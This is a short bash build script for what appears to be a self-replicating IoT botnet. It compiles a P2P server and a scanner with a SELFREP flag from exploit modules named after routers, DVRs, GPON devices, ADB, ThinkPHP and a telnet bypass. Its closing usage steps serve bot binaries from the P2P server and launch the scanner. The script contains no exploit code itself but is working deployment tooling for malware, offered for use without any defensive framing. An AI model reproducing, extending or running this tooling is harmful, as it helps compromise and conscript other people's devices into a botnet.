#!/bin/bash

echo "Scanner Build"
echo "============="
echo ""

mkdir -p scanners-bin

echo "[*] Building P2P server..."
gcc -O3 -o scanners-bin/p2p_server scanners-exploits/p2p_server.c && echo "[+] OK" || { echo "[-] Failed"; exit 1; }

echo "[*] Building scanners..."
gcc -std=gnu99 -DSELFREP -O3 -o scanners-bin/scanner \
    scanners-exploits/run_scanners.c \
    scanners-exploits/scanner.c \
    scanners-exploits/ssh.c \
    scanners-exploits/huawei.c \
    scanners-exploits/zyxel.c \
    scanners-exploits/dvr.c \
    scanners-exploits/zhone.c \
    scanners-exploits/fiber.c \
    scanners-exploits/adb.c \
    scanners-exploits/dlink.c \
    scanners-exploits/hilink.c \
    scanners-exploits/xm.c \
    scanners-exploits/asus.c \
    scanners-exploits/jaws.c \
    scanners-exploits/linksys.c \
    scanners-exploits/linksys8080.c \
    scanners-exploits/hnap.c \
    scanners-exploits/netlink.c \
    scanners-exploits/tr064.c \
    scanners-exploits/realtek.c \
    scanners-exploits/thinkphp.c \
    scanners-exploits/telnetbypass.c \
    scanners-exploits/gpon_scanner.c \
    scanners-exploits/goahead.c \
    scanners-exploits/util.c \
    scanners-exploits/rand.c \
    scanners-exploits/table.c \
    -lpthread 2>/dev/null && echo "[+] OK" || { echo "[-] Failed"; exit 1; }

echo ""
echo "Done."
echo ""
echo "Usage:"
echo "  1. cp bins/axis.* ./bins/"
echo "  2. ./scanners-bin/p2p_server ./bins"
echo "  3. ./scanners-bin/scanner"
